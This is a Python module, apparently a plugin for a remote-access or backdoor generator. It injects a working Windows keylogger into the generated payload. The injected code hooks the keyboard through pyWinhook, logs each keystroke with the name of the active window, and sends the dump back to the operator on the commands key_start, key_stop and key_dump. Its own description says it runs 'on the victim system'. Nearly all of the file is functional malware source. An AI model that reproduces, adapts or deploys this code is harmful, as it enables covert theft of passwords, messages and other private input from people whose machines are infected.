# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import pyWinhook')
        self.config.import_statements.append('import pythoncom')
        self.config.import_statements.append('import threading')
        self.config.import_statements.append('from ctypes import windll')
        self.config.global_objs.append('keylog = ""')
        self.config.global_objs.append('window = ""')
        self.config.global_objs.append('active_logger = False')
        self.config.functions.append('''
def OnKeyboardEvent(event):
    global window
    global keylog
    sample_space = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
    try:
        letter = event.Key
        if event.WindowName != window:
            keylog += '\\n\\n<User started typing in new window : ' + event.WindowName + '>\\n\\n'
            window = event.WindowName
        if letter not in sample_space:
            keylog += '[' + letter + ']'
        else:
            keylog += letter
    except:
        keylog += '[Error Logging Key!]'
    return True

def key(option):
    global active_logger
    global keylog
    if option == 'key_start':
        if active_logger:
            send_all(s,'[-]Keylogger already started')
        else:
            hooks_manager = pyWinhook.HookManager()
            hooks_manager.KeyDown = OnKeyboardEvent
            hooks_manager.HookKeyboard()
            active_logger = not active_logger
            send_all(s,'[+]Activated keylogger')
            while True:
                if not active_logger:
                    hooks_manager.UnhookKeyboard()
                    windll.user32.PostQuitMessage(0)
                    return
                else:
                    pythoncom.PumpWaitingMessages()
    elif option == 'key_stop':
        if not active_logger:
            send_all(s,'[-]Keylogger not started')
        else:
            active_logger = not active_logger
            send_all(s,'[+]Stopped keylogger')
    elif option == 'key_dump':
        send_all(s,'[+]Keylog dump : \\n' + keylog + '\\n')
        keylog = ""''')
        self.config.logics.append('''
            elif command in ('key_start','key_stop','key_dump'):
                t = threading.Thread(target=key, args=(data,))
                t.start()''')
        self.config.help_menu['key_start'] = 'Start the keylogger'
        self.config.help_menu['key_stop'] = 'Stop the keylogger'
        self.config.help_menu['key_dump'] = 'Dump the captured in-memory keystrokes'
    elif option == 'info':
        self.log.blank('\nName             : Keylogger and window logger component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : PyWinhook (External), pythoncom (External), threading, ctypes' \
                       '\nCommands         : key_start, key_stop, key_dump' \
                       '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n')
        return {
                "Name": "Keylogger and window logger component",
                "OS": "Windows",
                "Required Modules": "PyWinhook (External), pythoncom (External), threading, ctypes",
                "Commands": "key_start, key_stop, key_dump",
                "Description": "Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command"}
